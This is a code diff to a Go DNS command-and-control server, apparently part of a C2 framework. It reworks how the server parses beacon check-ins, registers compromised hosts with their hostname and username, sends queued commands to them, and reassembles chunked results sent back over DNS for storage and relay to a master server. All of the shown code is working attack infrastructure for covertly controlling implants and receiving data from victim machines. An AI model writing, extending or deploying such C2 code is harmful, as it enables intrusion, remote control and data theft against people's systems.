@@ -6,7 +6,6 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"strconv"
 	"strings"
@@ -1628,136 +1627,236 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return "", false
 	}
 
-	// Parse beacon data
-	var beaconData struct {
-		ID       string `json:"id"`
-		Hostname string `json:"hostname"`
-		Username string `json:"username"`
-		OS       string `json:"os"`
-		Arch     string `json:"arch"`
-		Result   string `json:"result,omitempty"`  // Task result if any
-		TaskID   string `json:"task_id,omitempty"` // Task ID for result
-	}
-
-	if err := json.Unmarshal([]byte(decoded), &beaconData); err != nil {
+	// Parse beacon data - STRICTLY pipe-delimited for DNS C2
+	// Format: TYPE|DATA...
+	msgParts := strings.Split(decoded, "|")
+	if len(msgParts) < 2 {
 		if c2.debug {
-			logf("[C2] Failed to unmarshal beacon data: %v", err)
+			logf("[C2] Invalid payload format (too short)")
 		}
 		return "", false
 	}
 
-	if beaconData.ID == "" {
-		return "", false
-	}
+	msgType := msgParts[0]
 
-	c2.mutex.Lock()
-	defer c2.mutex.Unlock()
+	// Common variables
+	var beaconID string
 
-	now := time.Now()
-	beacon, exists := c2.beacons[beaconData.ID]
-
-	// Register or update beacon
-	if !exists {
-		beacon = &Beacon{
-			ID:        beaconData.ID,
-			Hostname:  beaconData.Hostname,
-			Username:  beaconData.Username,
-			OS:        beaconData.OS,
-			Arch:      beaconData.Arch,
-			FirstSeen: now,
-			LastSeen:  now,
-			IPAddress: clientIP,
-			TaskQueue: []Task{},
+	switch msgType {
+	case "CHK":
+		// CHK|id|hostname|username|os|arch|timestamp
+		if len(msgParts) < 6 {
+			return "", false
 		}
-		c2.beacons[beaconData.ID] = beacon
-		logf("[C2] New beacon registered: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
+		beaconID = msgParts[1]
+		hostname := msgParts[2]
+		username := msgParts[3]
+		osType := msgParts[4]
+		arch := msgParts[5]
 
-		// Persist new beacon
-		if c2.db != nil {
-			go func(b *Beacon) {
-				if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
-					logf("[DB] Failed to save new beacon: %v", err)
-				}
-			}(beacon)
-		}
+		c2.mutex.Lock()
+		now := time.Now()
+		beacon, exists := c2.beacons[beaconID]
 
-		// Report to Master
-		if masterClient != nil {
-			go masterClient.ReportBeacon(beacon)
-		}
-	} else {
-		beacon.LastSeen = now
-		beacon.IPAddress = clientIP
+		// Register or update beacon
+		if !exists {
+			beacon = &Beacon{
+				ID:        beaconID,
+				Hostname:  hostname,
+				Username:  username,
+				OS:        osType,
+				Arch:      arch,
+				FirstSeen: now,
+				LastSeen:  now,
+				IPAddress: clientIP,
+				TaskQueue: []Task{},
+			}
+			c2.beacons[beaconID] = beacon
+			logf("[C2] New beacon registered: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
 
-		// Persist update (async to avoid blocking)
-		if c2.db != nil {
-			go func(id string) {
-				if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
-					logf("[DB] Failed to update beacon status: %v", err)
-				}
-			}(beacon.ID)
-		}
-	}
-
-	// Handle task result if present
-	if beaconData.Result != "" && beaconData.TaskID != "" {
-		// Process result...
-		// For simplicity, we'll just log it and mark task as completed
-		// In a real implementation, we'd handle chunked results here
-		if task, ok := c2.tasks[beaconData.TaskID]; ok {
-			task.Result = beaconData.Result
-			task.Status = "completed"
-			beacon.CurrentTask = ""
-
-			logf("[C2] Received result for task %s from %s", beaconData.TaskID, beacon.ID)
-
-			// Persist result
+			// Persist new beacon
 			if c2.db != nil {
-				go func(tid, bid, res string) {
-					c2.db.SaveTaskResult(tid, bid, res, 0, 1)
-					c2.db.UpdateTaskStatus(tid, "completed")
-				}(beaconData.TaskID, beacon.ID, beaconData.Result)
+				go func(b *Beacon) {
+					if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
+						logf("[DB] Failed to save new beacon: %v", err)
+					}
+				}(beacon)
 			}
 
 			// Report to Master
 			if masterClient != nil {
-				// Check if it's a master task
-				if _, isMasterTask := c2.masterTaskIDs[beaconData.TaskID]; isMasterTask {
-					go masterClient.SubmitResult(c2.masterTaskIDs[beaconData.TaskID], beacon.ID, 0, 1, beaconData.Result)
+				go masterClient.ReportBeacon(beacon)
+			}
+		} else {
+			beacon.LastSeen = now
+			beacon.IPAddress = clientIP
+
+			// Persist update (async to avoid blocking)
+			if c2.db != nil {
+				go func(id string) {
+					if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
+						logf("[DB] Failed to update beacon status: %v", err)
+					}
+				}(beacon.ID)
+			}
+		}
+
+		// Check for pending tasks
+		if len(beacon.TaskQueue) > 0 {
+			// Get next task
+			task := beacon.TaskQueue[0]
+			beacon.TaskQueue = beacon.TaskQueue[1:] // Dequeue
+			beacon.CurrentTask = task.ID
+			task.Status = "sent"
+			task.SentAt = &now
+
+			logf("[C2] Sending task %s to beacon %s: %s", task.ID, beacon.ID, task.Command)
+
+			// Persist task update
+			if c2.db != nil {
+				go func(t Task) {
+					if err := c2.db.SaveTask(&t); err != nil && c2.debug {
+						logf("[DB] Failed to update task status: %v", err)
+					}
+				}(task)
+			}
+
+			// Notify Master that we delivered the task
+			if masterClient != nil {
+				if masterID, ok := c2.masterTaskIDs[task.ID]; ok {
+					go masterClient.MarkTaskDelivered(masterID)
+				}
+			}
+
+			c2.mutex.Unlock()
+			return fmt.Sprintf("TASK|%s|%s", task.ID, task.Command), true
+		}
+		c2.mutex.Unlock()
+		return "ACK", true
+
+	case "RESULT_META":
+		// RESULT_META|id|taskID|len|chunks|timestamp
+		if len(msgParts) < 5 {
+			return "", false
+		}
+		beaconID = msgParts[1]
+		taskID := msgParts[2]
+		totalSize, _ := strconv.Atoi(msgParts[3])
+		totalChunks, _ := strconv.Atoi(msgParts[4])
+
+		c2.mutex.Lock()
+		if _, exists := c2.expectedResults[taskID]; !exists {
+			c2.expectedResults[taskID] = &ExpectedResult{
+				BeaconID:     beaconID,
+				TaskID:       taskID,
+				TotalSize:    totalSize,
+				TotalChunks:  totalChunks,
+				ReceivedAt:   time.Now(),
+				ReceivedData: make([]string, totalChunks),
+			}
+			if c2.debug {
+				logf("[C2] Expecting result for task %s: %d chunks, %d bytes", taskID, totalChunks, totalSize)
+			}
+		}
+		c2.mutex.Unlock()
+		return "ACK", true
+
+	case "DATA":
+		// DATA|id|taskID|chunkIndex|chunk|timestamp
+		// Use SplitN to preserve pipes in chunk data
+		// DATA|id|taskID|chunkIndex|chunk|timestamp
+		// 1    2  3      4          5...
+		dataParts := strings.SplitN(decoded, "|", 5)
+		if len(dataParts) < 5 {
+			return "", false
+		}
+
+		// The last part contains "chunk|timestamp"
+		// We need to split off the timestamp from the end
+		lastPart := dataParts[4]
+		lastPipeIdx := strings.LastIndex(lastPart, "|")
+		if lastPipeIdx == -1 {
+			return "", false
+		}
+
+		chunkData := lastPart[:lastPipeIdx]
+		// timestamp := lastPart[lastPipeIdx+1:]
+
+		// beaconID := dataParts[1]
+		taskID := dataParts[2]
+		chunkIndex, _ := strconv.Atoi(dataParts[3])
+
+		c2.mutex.Lock()
+		if expected, ok := c2.expectedResults[taskID]; ok {
+			// Chunk index is 1-based from client
+			if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
+				expected.ReceivedData[chunkIndex-1] = chunkData
+				expected.LastChunkIndex = chunkIndex
+				if c2.debug {
+					logf("[C2] Received chunk %d/%d for task %s", chunkIndex, expected.TotalChunks, taskID)
 				}
 			}
 		}
-	}
+		c2.mutex.Unlock()
+		return "ACK", true
 
-	// Check for pending tasks
-	if len(beacon.TaskQueue) > 0 {
-		// Get next task
-		task := beacon.TaskQueue[0]
-		beacon.TaskQueue = beacon.TaskQueue[1:] // Dequeue
-		beacon.CurrentTask = task.ID
-		task.Status = "sent"
-		task.SentAt = &now
+	case "RESULT_COMPLETE":
+		// RESULT_COMPLETE|id|taskID|totalChunks|timestamp
+		if len(msgParts) < 4 {
+			return "", false
+		}
+		beaconID = msgParts[1]
+		taskID := msgParts[2]
 
-		logf("[C2] Sending task %s to beacon %s: %s", task.ID, beacon.ID, task.Command)
+		c2.mutex.Lock()
+		expected, ok := c2.expectedResults[taskID]
+		if !ok {
+			c2.mutex.Unlock()
+			return "ACK", true // Already processed or unknown
+		}
 
-		// Persist task update
+		// Reassemble result
+		fullResult := strings.Join(expected.ReceivedData, "")
+		delete(c2.expectedResults, taskID)
+
+		// Update task
+		if task, ok := c2.tasks[taskID]; ok {
+			task.Result = fullResult
+			task.Status = "completed"
+			// Clear current task from beacon
+			if beacon, exists := c2.beacons[beaconID]; exists && beacon.CurrentTask == taskID {
+				beacon.CurrentTask = ""
+			}
+		}
+		c2.mutex.Unlock()
+
+		logf("[C2] Result complete for task %s (%d bytes)", taskID, len(fullResult))
+
+		// Persist result
 		if c2.db != nil {
-			go func(t Task) {
-				if err := c2.db.SaveTask(&t); err != nil && c2.debug {
-					logf("[DB] Failed to update task status: %v", err)
-				}
-			}(task)
+			go func(tid, bid, res string) {
+				c2.db.SaveTaskResult(tid, bid, res, 0, 1)
+				c2.db.UpdateTaskStatus(tid, "completed")
+			}(taskID, beaconID, fullResult)
 		}
 
-		// Notify Master that we delivered the task
+		// Report to Master
 		if masterClient != nil {
-			if masterID, ok := c2.masterTaskIDs[task.ID]; ok {
-				go masterClient.MarkTaskDelivered(masterID)
+			c2.mutex.RLock()
+			masterID, isMasterTask := c2.masterTaskIDs[taskID]
+			c2.mutex.RUnlock()
+
+			if isMasterTask {
+				go masterClient.SubmitResult(masterID, beaconID, 0, 1, fullResult)
 			}
 		}
 
-		return fmt.Sprintf("TASK|%s|%s", task.ID, task.Command), true
-	}
+		return "ACK", true
 
-	return "ACK", true
+	default:
+		if c2.debug {
+			logf("[C2] Unknown message type: %s", msgType)
+		}
+		return "", false
+	}
 }
